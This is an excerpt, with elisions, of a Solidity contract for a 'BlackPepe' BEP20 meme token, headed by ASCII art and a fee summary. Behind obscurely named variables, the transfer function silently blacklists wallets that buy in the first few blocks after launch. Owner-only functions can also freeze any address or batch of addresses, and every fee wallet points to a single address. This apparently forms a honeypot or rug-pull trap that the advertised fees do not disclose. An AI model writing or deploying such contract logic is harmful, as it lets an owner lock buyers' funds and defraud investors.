...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀
 BLACKPEPE Token BNB (bep20)
 Tax 0% buy 2% sell
 Total Supply- 421123123123123042069000
 For Black Pepe
             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣏⢹⠰⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⢺⠰⠀⠀
...
contract BlackPepe is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public _isCatalizeed;
    ...
    uint256 public lastmanacast;
    uint8 public rollertrunk = 3;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 421123123123123042069000;
    ...
    address payable private _appAddress = payable(0xb8404737f70Ba613B58B266209B8ee43C87bfbC5);
    address payable private _marketingAddress = payable(0xb8404737f70Ba613B58B266209B8ee43C87bfbC5);
    address payable private _buybackAddress = payable(0xb8404737f70Ba613B58B266209B8ee43C87bfbC5);
    address payable private _burnAddress = payable(0xb8404737f70Ba613B58B266209B8ee43C87bfbC5);
    ...
    function setrollertrunk(uint8 _blocks) external onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_isCatalizeed[from], 'Catalizeed address');
        ...
        if (!liquidityLaunched) {
            if (to == uniswapV2Pair) {
                ...
                lastmanacast = block.number + rollertrunk;
            }
        }

    
        if (from != address(_PresaleAddress)) {
            if(liquidityLaunched && block.number <= lastmanacast && !isFirstLaunch){
                _redisFee = _redisFeeOnBuy;
                _taxFee = _taxFeeOnBuy;
                _tokenTransfer(from,to,amount);
                if (to != address(uniswapV2Pair)) {
                    _isCatalizeed[to]=true;
                }
                return;
            }
        }
    ...
    event CatalizeAddress(address indexed account, bool value);
    function catalizeAddress(address account, bool value) public onlyOwner{
        _isCatalizeed[account] = value;
        emit CatalizeAddress(account, value);
    }

    event CatalizeMultiAddresses(address[] accounts, bool value);
    function catalizeMultiAddresses(address[] calldata accounts, bool value) public onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++) {
            _isCatalizeed[accounts[i]] = value;
        }
        emit CatalizeMultiAddresses(accounts, value);
    }
